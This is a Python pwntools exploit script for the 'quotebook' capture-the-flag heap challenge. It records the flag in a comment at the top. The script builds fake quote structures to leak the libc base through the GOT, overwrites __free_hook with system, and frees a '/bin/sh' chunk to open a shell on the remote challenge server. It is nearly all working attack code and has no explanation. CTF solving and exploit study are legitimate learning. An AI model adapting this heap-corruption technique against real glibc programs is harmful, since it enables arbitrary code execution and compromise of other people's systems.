#flag = dvCTF{1754c1d6703e7cd4765d2d6021291332}
from pwn import *

ld = ELF("./ld-2.31.so")
elf = ELF("./quotebook")
libc = ELF("./libc.so.6")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("challs.dvc.tf", 2222)

book = 0x4040e0
gadget = [0xe6e73, 0xe6e76, 0xe6e79]
def sla(s, d):
	target.sendlineafter(s, d)

def add(title, content, title_size=0, content_size=0):
	if title_size*content_size == 0:
		title_size = len(title)
		content_size = len(content)
	sla(" > ", "2")
	sla(" > ", str(title_size))
	sla(" > ", str(content_size))
	sla(" > ", title)
	sla(" > ", content)

def display(idx):
	sla(" > ", "3")
	sla(" > ", str(idx))

def edit(idx, content):
	sla(" > ", "4")
	sla(" > ", str(idx))
	sla(" > ", content)

def delete(idx):
	sla(" > ", "5")
	sla(" > ", str(idx))


add("A"*0x10, "B"*0x10)		#1
add("A"*0x10, "B"*0x10)		#2
add("A"*0x10, "B"*0x10)		#3
add("A"*0x10, "B"*0x10)		#4
add("A"*0x10, "B"*0x10)		#5
add("A"*0x10, "B"*0x10)		#6
add("A"*0x10, "B"*0x10)		#7
delete(1)
delete(2)

fake_quote = ""
fake_quote += p64(book) + p64(0x90)
fake_quote += p64(elf.got['free']) + p64(0x14)
fake_quote += p64(0x401236) + p64(0x401294)
add("BLA", fake_quote, 0x10, 0x36)		#8

display(1)
target.recvuntil("[+] ")
libc_base = u64(target.recvuntil("[>]", drop=True).ljust(8, "\x00")) - libc.sym['free']
log.success("LIBC Base: " + hex(libc_base))

edit(1, p64(libc_base + libc.sym['__free_hook'] - 8))

delete(4)
delete(5)

fake_quote = ""
fake_quote += p64(libc_base + libc.sym['__free_hook'] - 8) + p64(0x90)
fake_quote += p64(elf.got['free']) + p64(0x10)
fake_quote += p64(0x401236) + p64(0x401294)
add("BLA", fake_quote, 0x10, 0x36)		#9

edit(4, "/bin/sh\x00" + p64(libc_base + libc.sym['system']))
delete(1)

target.interactive()